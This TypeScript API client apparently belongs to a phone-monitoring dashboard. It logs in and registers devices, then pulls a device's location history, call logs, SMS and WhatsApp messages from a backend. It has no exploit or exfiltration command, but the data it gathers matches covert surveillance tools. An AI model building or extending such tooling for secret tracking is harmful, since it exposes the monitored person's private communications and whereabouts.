import axios from 'axios'

const http = axios.create({ baseURL: '/api/v1' })

// Attach JWT token to every request
http.interceptors.request.use(cfg => {
  const token = localStorage.getItem('token')
  if (token) cfg.headers.Authorization = `Bearer ${token}`
  return cfg
})

// Types
export interface Device       { id: number; name: string; deviceToken: string; registeredAt: string }
export interface LocationDto  { latitude: number; longitude: number; accuracy: number; timestamp: number }
export interface CallLogDto   { number: string; name: string; type: number; date: number; duration: number }
export interface SmsDto       { address: string; body: string; date: number; type: number }
export interface WhatsAppDto  { sender: string; message: string; timestamp: number }

// Auth
export const login    = (email: string, password: string) =>
  http.post<{ token: string; name: string; email: string }>('/auth/login', { email, password })

export const register = (email: string, password: string, name: string) =>
  http.post<{ token: string; name: string; email: string }>('/auth/register', { email, password, name })

// Devices
export const getDevices       = ()           => http.get<Device[]>('/dashboard/devices')
export const registerDevice   = (name: string) => http.post<Device>('/dashboard/devices', { name })

// Device data
export const getLatestLocation = (deviceId: number) =>
  http.get<LocationDto>(`/dashboard/devices/${deviceId}/location/latest`)

export const getLocations = (deviceId: number, limit = 200) =>
  http.get<LocationDto[]>(`/dashboard/devices/${deviceId}/locations?limit=${limit}`)

export const getCallLogs  = (deviceId: number) =>
  http.get<CallLogDto[]>(`/dashboard/devices/${deviceId}/calls`)

export const getSmsLogs   = (deviceId: number) =>
  http.get<SmsDto[]>(`/dashboard/devices/${deviceId}/sms`)

export const getWhatsApp  = (deviceId: number) =>
  http.get<WhatsAppDto[]>(`/dashboard/devices/${deviceId}/whatsapp`)
